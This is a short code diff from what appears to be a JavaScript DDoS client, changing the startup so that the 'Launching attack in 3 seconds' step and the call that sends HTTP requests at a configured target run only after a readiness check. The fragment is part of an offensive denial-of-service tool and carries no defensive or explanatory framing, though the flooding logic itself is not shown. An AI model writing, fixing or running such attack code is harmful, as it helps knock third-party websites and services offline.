@@ -6,10 +6,12 @@ client.build()
         console.error("Client can't enter ready " + error + "")
     })
     .then(c => {
-        console.log("Dddos client is now ready. Launching attack in 3 seconds.")
-        setTimeout(() => {
-            client.createHttpRequest(config.target)
-        }, 3000);
+        if (c.isReady) {
+            console.log("Dddos client is now ready. Launching attack in 3 seconds.")
+            setTimeout(() => {
+                client.createHttpRequest(config.target)
+            }, 3000);
+        }
     })
 
 client.on("requestDebug", msg => {
